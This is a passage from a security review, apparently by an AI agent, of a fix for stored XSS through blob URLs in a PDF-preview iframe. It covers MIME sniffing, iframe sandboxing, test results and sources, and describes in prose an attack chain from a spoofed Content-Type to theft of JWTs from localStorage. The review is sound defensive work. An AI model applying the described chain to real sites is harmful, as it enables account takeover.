  wrapper itself (which the passing `.test.tsx` assertion below would
  catch).

- **Can browser MIME sniffing override an explicit `application/pdf`
  declaration back into HTML/script execution?** No. Per the WHATWG MIME
  Sniffing spec's sniffing-in-a-context algorithm, content sniffing that
  can override the *supplied* Content-Type only applies when the supplied
  type is: absent, an "unknown" type (`application/octet-stream`,
  `unknown/unknown`, `*/*`), one of a small set of `text/plain` variants,
  or (for the narrower image/audio-video/font sniffing branch) already an
  image/audio/video/font type being disambiguated *within that same
  category*. `application/pdf` is none of these — it's an explicit,
  registered, unambiguous type — so the sniffed/computed MIME type used
  for rendering/dispatch decisions **is** the supplied type, full stop; no
  browser sniffs a declared `application/pdf` payload and decides to parse
  it as `text/html` instead. This is also long-established, deliberate
  browser security architecture — the sniffing spec exists specifically to
  *close* historical type-confusion holes (e.g. old IE guessing HTML from
  content regardless of a `text/plain` declaration), not to reopen them
  for registered, non-ambiguous types. Corroborated by a wire-webapp
  security advisory for the *same vulnerability class* (stored XSS via
  `createObjectURL` on a blob whose declared type was attacker-influenced)
  — their fix was exactly this pattern: "inspect \[the] MIME type... only
  image MIME types will be forwarded which prevents objects of MIME type
  `text/html` to execute JavaScript code" (see Sources). That the accepted
  industry fix for this exact bug class is "constrain/force the declared
  type before `createObjectURL`" is independent confirmation this
  mechanism is sound, not merely this codebase's own reasoning about it.

- **Does the fetch step itself (before any retyping) ever risk executing
  attacker content?** No — `fetchDrawingBlob()` uses axios with
  `responseType: 'blob'`, i.e. an XHR/fetch data request, not a navigation.
  Nothing is rendered or parsed as a document during the fetch regardless
  of what Content-Type the server actually returns; the response is
  captured as inert bytes+type into a `Blob` object in JS memory. The only
  place in this entire flow where content could ever become "live" is the
  `<iframe src={pdfUrl}>` render, and that `pdfUrl` is now always backed by
  the force-retyped Blob.

- **Does this still hold if the backend allowlist were ever bypassed, or
  if some other future upload path served a spoofed Content-Type?** Yes —
  and this is a genuine improvement over relying on `sandbox=""` (which at
  least was independent of the allowlist) *and* over relying on the
  allowlist alone: force-retype does not consult the server-declared
  content type at all, from any source. Whatever `/file-storage/download`
  actually returns — correct, spoofed via a bypassed allowlist, or spoofed
  via some entirely different upload path this review hasn't seen — the
  bytes get wrapped into a Blob whose `.type` this hook sets unconditionally
  to `'application/pdf'`. The one precondition for this to hold is that
  `useDrawingPdfUrl()` only ever runs for something the caller has decided
  is a PDF — true today (gated by `DrawingPreviewPanel.isPdf()`, a
  filename-suffix check) but worth flagging as the actual trust boundary
  now: this hook must never be reused for a code path that renders
  non-PDF content, since it *always* asserts `application/pdf` regardless
  of what the bytes are.

**Conclusion: yes, the force-retype genuinely prevents the browser from
ever treating the resulting `blob:` URL as executable HTML/script,
independent of the original blob's `.type` or the actual byte content.**
No leak channel found across the vectors the review brief asked about
(sniffing, `Content-Disposition`, original-type passthrough) or the
additional ones this pass checked (fetch-time execution, allowlist-bypass
robustness).

### Does removing `sandbox=""` reopen any other risk?

Evaluated what an unsandboxed iframe now permits that force-retype alone
doesn't cover:

- **The stored-XSS chain from F-001 (spoofed Content-Type → same-origin
  HTML/script execution) — closed**, per the analysis above; this was the
  entire point of both the allowlist and (previously) the sandbox, and
  force-retype closes it on its own, independent of either.
- **Malformed-but-declared-PDF bytes being reinterpreted some other way**
  — no; per the sniffing analysis above, `application/pdf` is not
  sniffable-away, and PDFium either renders a well-formed document or
  shows its own "Failed to load PDF document" error UI on malformed
  bytes — it does not fall back to an HTML parser.
- **A genuinely valid (or validly-structured-but-malicious) PDF using its
  own in-format capabilities** — e.g. `/URI` link actions that navigate
  the frame or open a new tab, or the limited Acrobat-style form-JS subset
  PDFium supports. Without `sandbox`, nothing in this iframe blocks those.
  This is real but **out of scope for F-001 / R-012**: it's a generic
  "can a PDF viewer be misused by a malicious-but-valid PDF" question,
  applicable to *any* PDF preview feature on *any* site (Gmail attachment
  previews, Google Drive, etc. carry the identical exposure), not a
  content-type-confusion or same-origin-script-execution issue, and it
  isn't something `sandbox=""` was ever capable of stopping either for
  this app — Chromium refuses to run the native viewer under sandbox at
  all, so there was never a shipped state where sandbox mitigated this
  residual PDF-format risk. Removing sandbox restores the baseline risk
  level of "an iframe showing a PDF," not a regression against any
  previously-working protection. Noting it here as a distinct, much
  narrower, pre-existing-and-inherent risk class — not reopening F-001,
  not part of this verdict, no action recommended beyond what any
  PDF-preview feature already carries.
- **Is there a sandbox token combination compatible with the native PDF
  viewer worth adding back?** Researched, not guessed: no. Chromium bug
  413851 and the related `whatwg/html#3958` interop issue (both checked
  live this pass) confirm the native viewer is disabled by the mere
  *presence* of the `sandbox` attribute (any value, including a
  token-populated one) because sandbox unconditionally disables plugins
  and the native PDF viewer is implemented as one internally; the
  `allow-plugins` token some developers have asked for
  (`lists.w3.org/Archives/Public/public-html/2011Jun/0330.html`) was never
  adopted into the HTML spec. There is no token or combination of tokens
  that both restricts the frame and lets Chromium's native PDF viewer
  render. This is a real engine limitation, not a misconfiguration on this
  branch's part.

### Tests

Re-ran both suites myself (not taken on the implementer's summary):

- `npx vitest run src/hooks/useDrawings.test.tsx
  src/components/drawings/DrawingPreviewPanel.test.tsx` (repo root) —
  **13/13 pass**, both files. Confirmed present and passing:
  - `useDrawings.test.tsx` → `useDrawingPdfUrl` › *"forces the resulting
    blob to type application/pdf regardless of the server-declared
    content-type"* — asserts, via a spy on `URL.createObjectURL`, that the
    `Blob` object actually passed to it has `.type === 'application/pdf'`
    even when `fetchDrawingBlob` resolves a blob whose declared type is
    `text/html` with `<script>` bytes.
  - `DrawingPreviewPanel.test.tsx` → *"does not sandbox the PDF iframe
    (Chromium does not run its native PDF viewer inside a sandboxed
    iframe — verified live)"* — asserts `iframe.hasAttribute('sandbox') ===
    false`.
- `cd backend && npx jest
  src/modules/file-storage/file-storage.controller.spec.ts` — **5/5
  pass** — backend allowlist unchanged and still enforced (accepts
  `application/pdf`/`application/octet-stream`, rejects `text/html` and
  `image/svg+xml`, still requires both fields).

### Final verdict

**F-001: RESOLVED** (confirmed under the corrected mechanism — this
supersedes the `sandbox=""`-based RESOLVED verdict above, which described
a fix no longer present in the code). The concrete stored-XSS PoC (spoofed
`Content-Type` → same-origin HTML/script render → `localStorage` JWT
theft) is closed by two independent layers that both remain effective
without `sandbox`:

1. The backend allowlist (unchanged) — only `application/pdf` or
   `application/octet-stream` can ever reach GCS as stored `Content-Type`
   metadata via `presignedUpload()`.
2. The frontend force-retype (new) — regardless of what content type is
   actually fetched, from any source, `useDrawingPdfUrl()` unconditionally
   constructs the object URL from a `Blob` typed `application/pdf`, which
   the browser cannot sniff back into HTML/script execution.

Either alone closes the concrete PoC; both together mean the fix doesn't
depend on backend correctness at all. `sandbox=""` is confirmed
incompatible with this feature (Chromium never runs its native PDF viewer
inside any sandboxed iframe, no token exists to fix this) and its removal
does not reopen the XSS chain — it only restores the same residual
in-format-PDF-capability risk every PDF-preview feature on the web
inherently carries, which is out of scope for this finding.

**No further action required to close F-001 / R-012** beyond what's
already landed on `dev-t-drawing-pdf-upload`. Risk register `R-012`
updated accordingly (see `docs/security/risk-register.md`).

**Sources (web research this pass):**
- [Issue 413851 in chromium: Sandbox breaks PDF rendering](https://bugs.chromium.org/p/chromium/issues/detail?id=413851)
- [Sandbox attribute on an iframe blocks PDF documents (issues.chromium.org mirror)](https://issues.chromium.org/issues/41028509)
- [Interop: pdf might or might not render in a sandboxed iframe (depending on a browser) · whatwg/html#3958](https://github.com/whatwg/html/issues/3958)
- [wireapp/wire-webapp — XSS through createObjectURL (GHSA-382j-mmc8-m5rw)](https://github.com/wireapp/wire-webapp/security/advisories/GHSA-382j-mmc8-m5rw)
- [MDN — Blob: Blob() constructor](https://developer.mozilla.org/en-US/docs/Web/API/Blob/Blob)
